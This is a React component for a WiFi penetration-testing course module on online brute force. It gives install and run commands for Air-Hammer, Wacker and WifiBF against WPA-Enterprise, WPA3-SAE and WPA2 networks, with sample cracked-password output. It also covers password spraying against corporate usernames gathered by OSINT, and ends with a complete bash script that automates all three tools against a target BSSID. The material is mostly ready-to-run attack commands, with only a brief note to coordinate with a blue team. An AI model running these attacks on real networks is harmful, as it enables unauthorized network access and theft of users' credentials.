import { Hammer, AlertTriangle, Info, Key, Wifi } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const OnlineBruteForce = () => {
  const bruteForceScript = `#!/bin/bash
# WiFi Online Brute Force Toolkit Script
# Runs Air-Hammer, Wacker, and WifiBF against WPA targets
# Usage: sudo bash wifi_bruteforce.sh <interface> <bssid> <channel> <wordlist>

set -e

INTERFACE=\${1:?"Usage: \$0 <interface> <bssid> <channel> <wordlist>"}
BSSID=\${2:?"Specify target BSSID"}
CHANNEL=\${3:?"Specify target channel"}
WORDLIST=\${4:-/usr/share/wordlists/rockyou.txt}

RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
NC='\\033[0m'

print_status() { echo -e "\${CYAN}[*]\${NC} \$1"; }
print_success() { echo -e "\${GREEN}[+]\${NC} \$1"; }
print_warning() { echo -e "\${YELLOW}[!]\${NC} \$1"; }

echo "=========================================="
echo "   WiFi Online Brute Force Toolkit"
echo "=========================================="
echo ""
print_status "Target: \$BSSID on channel \$CHANNEL"
print_status "Wordlist: \$WORDLIST"
echo ""

# Check for tools
TOOLS_DIR="/opt/wifi-bruteforce"
mkdir -p "\$TOOLS_DIR"

# Try Air-Hammer first (WPA-Enterprise)
if command -v air-hammer &>/dev/null || [ -f "\$TOOLS_DIR/air-hammer/air-hammer.py" ]; then
    print_status "Running Air-Hammer (WPA-Enterprise brute force)..."
    python3 "\$TOOLS_DIR/air-hammer/air-hammer.py" \\
        -i \$INTERFACE \\
        -e "TargetSSID" \\
        -u users.txt \\
        -p "\$WORDLIST" \\
        -1 2>&1 | tee air_hammer_results.txt || true
    echo ""
fi

# Try Wacker (WPA3-SAE)
if [ -f "\$TOOLS_DIR/wacker/wacker.py" ]; then
    print_status "Running Wacker (WPA3-SAE brute force)..."
    python3 "\$TOOLS_DIR/wacker/wacker.py" \\
        --wordlist "\$WORDLIST" \\
        --ssid "TargetSSID" \\
        --bssid \$BSSID \\
        --interface \$INTERFACE \\
        --freq 2437 2>&1 | tee wacker_results.txt || true
    echo ""
fi

# Try WifiBF
if [ -f "\$TOOLS_DIR/WifiBF/WifiBF.py" ]; then
    print_status "Running WifiBF..."
    python3 "\$TOOLS_DIR/WifiBF/WifiBF.py" \\
        -i \$INTERFACE \\
        -b \$BSSID \\
        -w "\$WORDLIST" 2>&1 | tee wifibf_results.txt || true
fi

echo ""
print_success "Brute force attempts complete. Check result files."`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Hammer className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 10</span>
              <h2 className="text-2xl font-bold text-foreground">Online Brute Force Attacks</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Online brute force tools attempt to authenticate directly against wireless networks without 
            capturing handshakes. This module covers Air-Hammer for WPA-Enterprise, Wacker for WPA3-SAE, 
            and WifiBF for general WPA/WPA2 online attacks.
          </p>

          {/* Theory */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              Online vs Offline Brute Force
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">Offline (Module 04):</strong> Capture handshake → crack locally 
                at millions of passwords/second with hashcat. Fast but requires handshake capture.
              </p>
              <p>
                <strong className="text-foreground">Online (This Module):</strong> Connect directly to the AP with 
                each password attempt. Very slow (1-5 attempts/second) but works when handshake capture fails. 
                Also the ONLY way to attack WPA-Enterprise and WPA3-SAE networks.
              </p>
              <p>
                <strong className="text-foreground">When to Use Online:</strong> WPA-Enterprise (802.1X) networks, 
                WPA3-SAE networks, when PMKID/handshake capture fails, or for credential spraying against known usernames.
              </p>
            </div>
          </div>

          {/* Legal Warning */}
          <div className="p-4 rounded-lg border border-destructive/50 bg-destructive/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-destructive mb-1">Warning</h4>
                <p className="text-sm text-muted-foreground">
                  Online brute force generates authentication traffic visible to WIDS/WIPS. It may trigger 
                  account lockouts on enterprise networks. Always coordinate with the blue team.
                </p>
              </div>
            </div>
          </div>

          {/* Air-Hammer */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Key className="w-5 h-5 text-accent" />
              Air-Hammer — WPA-Enterprise Brute Force
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">Purpose:</strong> Brute forces WPA-Enterprise (802.1X) networks 
                using EAP-PEAP/MSCHAPv2. Tests username/password combinations against RADIUS authentication.
              </p>
              <p>
                <strong className="text-foreground">Why It's Unique:</strong> Most WiFi cracking tools only target 
                WPA-PSK. Air-Hammer specifically attacks enterprise authentication — the kind used in corporate environments.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Air-Hammer Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone https://github.com/Wh1t3Rh1n0/air-hammer.git && cd air-hammer"
              description="Step 1: Clone Air-Hammer"
              explanation="Air-Hammer is a Python tool for online brute force against WPA-Enterprise networks."
            />
            <CommandBlock
              command="sudo pip3 install scapy"
              description="Step 2: Install dependencies"
              explanation="Air-Hammer uses Scapy for crafting 802.1X authentication packets."
            />
            <CommandBlock
              command="sudo python3 air-hammer.py -i wlan1 -e CorpWiFi -u admin -P /usr/share/wordlists/rockyou.txt -1"
              description="Single username, password list"
              explanation="-i interface, -e SSID, -u single username, -P password file, -1 use Phase 1 only (faster). Tests each password against the specified username."
              output={`[*] Starting Air-Hammer against CorpWiFi
[*] Target SSID: CorpWiFi
[*] Username: admin
[*] Passwords to try: 14344391
[*] Trying: admin:password123
[-] Failed: admin:password123
[*] Trying: admin:admin
[-] Failed: admin:admin
[+] SUCCESS: admin:Welcome2024!`}
            />
            <CommandBlock
              command="sudo python3 air-hammer.py -i wlan1 -e CorpWiFi -U users.txt -P passwords.txt -1"
              description="Multiple usernames, password list"
              explanation="-U specifies a file of usernames. Tests every username/password combination. Create users.txt from OSINT (LinkedIn, email harvesting)."
            />
            <CommandBlock
              command="sudo python3 air-hammer.py -i wlan1 -e CorpWiFi -U users.txt -p 'Summer2024!' -1"
              description="Password spraying (one password, many users)"
              explanation="-p single password against all users. Avoids lockout by trying one common password across many accounts. Most effective attack against enterprise WiFi."
            />
          </div>

          {/* Wacker */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Wifi className="w-5 h-5 text-success" />
              Wacker — WPA3-SAE Online Brute Force
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">Purpose:</strong> The only tool specifically designed to brute force 
                WPA3-SAE (Simultaneous Authentication of Equals). WPA3 uses Dragonfly handshake which prevents offline attacks.
              </p>
              <p>
                <strong className="text-foreground">Why WPA3 Requires Online Attack:</strong> Unlike WPA2, you can't capture 
                and crack a WPA3 handshake offline. The Dragonfly protocol is resistant to offline dictionary attacks, making 
                online brute force the only viable approach.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Wacker Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone https://github.com/blunderbuss-wctf/wacker.git && cd wacker && sudo pip3 install -r requirements.txt"
              description="Step 1: Install Wacker"
              explanation="Wacker uses wpa_supplicant under the hood to perform SAE authentication attempts."
            />
            <CommandBlock
              command="sudo python3 wacker.py --wordlist /usr/share/wordlists/rockyou.txt --ssid TargetWPA3 --bssid AA:BB:CC:DD:EE:FF --interface wlan1 --freq 2437"
              description="Step 2: Run Wacker against WPA3 network"
              explanation="--freq is the frequency in MHz (2437 = channel 6). Wacker tries each password via SAE authentication. Very slow: ~1 attempt per second."
              output={`[*] Wacker - WPA3 Online Dictionary Attack
[*] Target: TargetWPA3 (AA:BB:CC:DD:EE:FF)
[*] Frequency: 2437 MHz (Channel 6)
[*] Wordlist: 14344391 passwords
[*] Trying: password
[-] Failed
[*] Trying: 123456
[-] Failed
[+] FOUND: MySecureP@ss2024`}
            />
            <CommandBlock
              command="sudo python3 wacker.py --wordlist top1000.txt --ssid TargetWPA3 --bssid AA:BB:CC:DD:EE:FF --interface wlan1 --freq 2437 --timeout 5"
              description="Wacker with timeout adjustment"
              explanation="--timeout adjusts wait time per attempt. Use a smaller wordlist (top1000) since online attacks are slow. Focus on most common passwords."
            />
          </div>

          {/* WifiBF */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Hammer className="w-5 h-5 text-warning" />
              WifiBF — General WiFi Brute Force
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">Purpose:</strong> A general-purpose WiFi password brute force tool 
                that works against WPA/WPA2 networks by attempting to connect with each password. Useful as an alternative 
                when handshake capture fails.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">WifiBF Setup & Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="cd /opt && sudo git clone https://github.com/aanarchyy/WifiBF.git && cd WifiBF"
              description="Install WifiBF"
              explanation="Clone from GitHub. Uses wpa_supplicant to attempt authentication with each password."
            />
            <CommandBlock
              command="sudo python3 WifiBF.py -i wlan1 -b AA:BB:CC:DD:EE:FF -w /usr/share/wordlists/rockyou.txt"
              description="Run WifiBF against target"
              explanation="-i interface (must be in managed mode), -b target BSSID, -w wordlist. Attempts connection with each password."
            />
            <CommandBlock
              command="sudo python3 WifiBF.py -i wlan1 -s TargetSSID -w top10000.txt -t 3"
              description="WifiBF by SSID with timeout"
              explanation="-s target by SSID name, -t timeout per attempt. Use a focused wordlist since online attacks are slow."
            />
          </div>

          {/* Strategy Guide */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Online Brute Force Strategy</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary font-mono">Network Type</th>
                    <th className="text-left py-2 pr-4 text-foreground">Tool</th>
                    <th className="text-left py-2 text-foreground">Speed</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">WPA-Enterprise</td>
                    <td className="py-2 pr-4">Air-Hammer</td>
                    <td className="py-2">~3-5 attempts/sec</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">WPA3-SAE</td>
                    <td className="py-2 pr-4">Wacker</td>
                    <td className="py-2">~1 attempt/sec</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">WPA/WPA2-PSK</td>
                    <td className="py-2 pr-4">WifiBF</td>
                    <td className="py-2">~1-2 attempts/sec</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">WPA/WPA2-PSK</td>
                    <td className="py-2 pr-4">Hashcat (offline)</td>
                    <td className="py-2">~500K+ attempts/sec</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Automation Script */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Automation Script</h3>
          <ScriptBlock
            title="WiFi Online Brute Force Toolkit"
            filename="wifi_bruteforce.sh"
            language="bash"
            description="Runs Air-Hammer, Wacker, and WifiBF against targets with configurable wordlists"
            code={bruteForceScript}
          />
        </div>
      </div>
    </section>
  );
};
